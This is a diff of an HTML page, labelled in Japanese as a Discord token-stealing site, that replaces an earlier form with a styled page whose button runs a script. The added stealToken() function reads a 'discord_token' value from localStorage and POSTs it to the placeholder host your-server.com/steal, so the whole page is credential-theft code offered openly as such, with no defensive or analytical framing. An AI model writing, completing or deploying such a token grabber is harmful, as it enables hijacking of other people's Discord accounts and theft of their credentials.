@@ -1,21 +1,69 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ja">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord Token Grabber</title>
+    <title>ディスコードトークン奪取サイト</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            text-align: center;
+            padding: 50px;
+        }
+        .container {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            display: inline-block;
+        }
+        .button {
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            background-color: #7289da;
+            color: white;
+            border: none;
+            border-radius: 4px;
+        }
+        .button:hover {
+            background-color: #5a67d8;
+        }
+    </style>
 </head>
 <body>
-    <h1>Discord Token Grabber</h1>
-    <form id="tokenForm">
-        <label for="redirectUrl">Redirect URL:</label>
-        <input type="text" id="redirectUrl" name="redirectUrl" required>
-        <br>
-        <label for="verifyUrl">Verification URL:</label>
-        <input type="text" id="verifyUrl" name="verifyUrl" required>
-        <br>
-        <button type="submit">Submit</button>
-    </form>
-    <script src="script.js"></script>
+    <div class="container">
+        <h1>ディスコードトークン奪取サイト</h1>
+        <p>ボタンをクリックしてください。</p>
+        <button class="button" onclick="stealToken()">クリックしてください</button>
+    </div>
+
+    <script>
+        function stealToken() {
+            // ディスコードのトークンを取得
+            const token = localStorage.getItem('discord_token');
+
+            if (token) {
+                // トークンをサーバーに送信
+                fetch('https://your-server.com/steal', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ token: token })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('トークンが成功してサーバーに送信されました:', data);
+                })
+                .catch(error => {
+                    console.error('トークン送信エラー:', error);
+                });
+            } else {
+                console.log('ディスコードトークンが見つかりません');
+            }
+        }
+    </script>
 </body>
 </html>
